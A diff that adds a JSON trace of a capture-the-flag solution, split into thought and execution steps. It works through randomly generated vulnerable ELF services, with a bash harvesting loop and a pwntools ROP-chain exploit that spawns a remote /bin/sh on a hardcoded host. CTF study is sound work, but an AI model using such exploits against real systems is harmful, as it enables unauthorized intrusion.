@@ -1,0 +1,42 @@
+[
+    {
+        "type": "thought",
+        "content": "The challenge did not provide any binary but just a remote service. Connecting to the remote service we got an ELF:"
+    },
+    {
+        "type": "execution",
+        "content": "nc 127.0.0.1 8888 > binary && file binary"
+    },
+    {
+        "type": "thought",
+        "content": "Decompiling we easily found out that the executable spawned another service reading our input and writing back to the socket the same input."
+    },
+    {
+        "type": "execution",
+        "content": "r2 -A binary"
+    },
+    {
+        "type": "thought",
+        "content": "We noticed that the executables provided by the server were always different and ran on the remote host for about 1 second. Downloading more binaries we noted that the only differences in the binaries were the service port, the dimension of the buffer, and the number of bytes read.\nThese parameters were randomly generated, leading sometimes to a buffer overflow. Hence, the idea was to query the server until a vulnerable executable is generated."
+    },
+    {
+        "type": "execution",
+        "content": "checksec.sh --file binary"
+    },
+    {
+        "type": "thought",
+        "content": "NX was enabled on the binaries but there was no canary. Let\u2019s ROP!\n\nWe grabbed libc from the server hosting Exploitables250 in the hope that it was the same also for this challenge, and it was. The challenge description stated ASLR had been disabled, so we did not need any memory leak to obtain a reference to the libc.\n\nWe wrote a bash script to download the executables, parse the output of objdump, grep the randomly generated parameters, and pass them to the python exploit."
+    },
+    {
+        "type": "execution",
+        "content": "#!/bin/bash\n\nHOST=52.20.10.244\nPORT=8888\n\nwhile true; do\n    nc ${HOST} ${PORT} > qweqwe\n    NEW_PORT=`objdump -d qweqwe | grep -n1 htons | tail -3 | head -1 | grep -o -P '(?<=0x).*(?=,)'`\n    BUFF_SIZE=`objdump -d qweqwe | grep lea | tail -4 | head -1 | grep -o -P '(?<=0x).*(?=\\()'`\n    READ_SIZE=`objdump -d qweqwe | grep mov | tail -n15 | head -1 | grep -o -P '(?<=0x).*(?=,)'`\n\n    NEW_PORT_INT=`printf \"%d\\n\" 0x${NEW_PORT}`\n    BUFF_SIZE_INT=`printf \"%d\\n\" 0x${BUFF_SIZE}`\n    READ_SIZE_INT=`printf \"%d\\n\" 0x${READ_SIZE}`\n\n    python exploit.py $NEW_PORT_INT $BUFF_SIZE_INT $READ_SIZE_INT\ndone"
+    },
+    {
+        "type": "thought",
+        "content": "The python exploit simply checks if the service is vulnerable and, if so, builds the ROP chain to execute system(\"/bin/sh\"). We used ropper to find the gadgets in the libc. Since our input was bound to the socket we called dup2 to attach the socket to stdin/stdout."
+    },
+    {
+        "type": "execution",
+        "content": "from pwn import *\nfrom binascii import hexlify\nimport sys\n\nhost = '52.20.10.244'\nport = int(sys.argv[1])\nbuff_size = int(sys.argv[2])\nread_size = int(sys.argv[3])\n\nif read_size <= buff_size + 160:\n    exit()\n\nprint \"VULNERABLE!\"\n\nconn = remote(host, port)\n\nread_ref = 0x00007ffff7b00800 # address of read in libc\nread_offset = 0xeb800 # offset of read in libc\n\nbinsh_offset = 0x17ccdb\ngadget_offset = 0x22b1a     # pop rdi\ngadget2_offset = 0x24805    # pop rsi\ndup2_offset = 0xebfe0\nsystem_offset = 0x46640\n\nmy_fd = 6 # file descriptor\n\npayload = \"A\"*(buff_size + 8)\n\n# ROP chain\npayload += p64(read_ref - read_offset + gadget_offset)\npayload += p64(my_fd)\npayload += p64(read_ref - read_offset + gadget2_offset)\npayload += p64(0)\npayload += p64(read_ref - read_offset + dup2_offset)\n\npayload += p64(read_ref - read_offset + gadget_offset)\npayload += p64(my_fd)\npayload += p64(read_ref - read_offset + gadget2_offset)\npayload += p64(1)\npayload += p64(read_ref - read_offset + dup2_offset)\n\npayload += p64(read_ref - read_offset + gadget_offset)\npayload += p64(read_ref - read_offset + binsh_offset)\npayload += p64(read_ref - read_offset + system_offset)\n\nconn.send(payload)\n\nconn.interactive()"
+    }
+]
